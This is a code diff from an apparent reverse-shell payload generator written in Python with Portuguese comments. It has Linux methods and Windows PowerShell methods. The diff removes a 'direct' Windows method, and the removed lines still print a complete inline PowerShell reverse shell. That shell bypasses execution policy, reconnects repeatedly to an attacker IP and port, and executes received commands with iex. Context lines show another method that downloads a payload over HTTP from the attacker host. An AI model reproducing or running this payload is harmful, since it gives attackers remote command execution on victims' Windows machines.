@@ -18,7 +18,7 @@ class PayloadGenerator:
         
         # Métodos disponíveis por sistema operacional
         self.linux_methods = ['netcat', 'bash', 'python']
-        self.windows_methods = ['powershell', 'direct']
+        self.windows_methods = ['powershell']
     
     def generate_linux_payload(self, method: str, ip_shell: str, port: int) -> Dict[str, str]:
         """Gera payload para sistemas Linux"""
@@ -47,8 +47,8 @@ class PayloadGenerator:
         
         if method == 'powershell':
             return self._generate_powershell_payload(ip_shell, port)
-        elif method == 'direct':
-            return self._generate_direct_powershell_payload(ip_shell, port)
+        else:
+            raise ValueError(f"Método '{method}' não implementado")
     
     def _generate_powershell_payload(self, ip_shell: str, port: int) -> Dict[str, str]:
         """Gera payload PowerShell com download via HTTP"""
@@ -105,18 +105,6 @@ $EscritorDeFluxo.Close()
             'http_url': f"http://{ip_shell}:8000/{filename}"
         }
     
-    def _generate_direct_powershell_payload(self, ip_shell: str, port: int) -> Dict[str, str]:
-        """Gera payload PowerShell direto (inline)"""
-        # Payload PowerShell compactado para execução direta (versão melhorada)
-        compact_payload = f"powershell -ExecutionPolicy Bypass -Command \"do{{Start-Sleep 1;try{{$c=New-Object Net.Sockets.TCPClient('{ip_shell}',{port})}}catch{{}}}}until($c.Connected);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);function Write-Stream($t){{[byte[]]$script:b=0..$c.ReceiveBufferSize|%{{0}};$w.Write($t+'SHELL> ');$w.Flush()}};Write-Stream '';while(($i=$s.Read($b,0,$b.Length)) -gt 0){{$cmd=([text.encoding]::UTF8).GetString($b,0,$i-1);$out=try{{iex $cmd 2>&1|Out-String}}catch{{$_|Out-String}};Write-Stream($out)}};$w.Close()\""
-        
-        return {
-            'command': compact_payload,
-            'method': 'direct',
-            'os_type': 'windows',
-            'description': 'Windows PowerShell inline melhorado (reconexão automática)'
-        }
-    
     def get_available_methods(self, os_type: str) -> list:
         """Retorna métodos disponíveis para um sistema operacional"""
         if os_type.lower() == 'linux':
@@ -135,8 +123,7 @@ $EscritorDeFluxo.Close()
                 'python': 'Socket Python (requer Python instalado)'
             },
             'windows': {
-                'powershell': 'PowerShell avançado via HTTP (reconexão automática)',
-                'direct': 'PowerShell inline melhorado (execução direta com retry)'
+                'powershell': 'PowerShell avançado via HTTP (reconexão automática)'
             }
         }
         
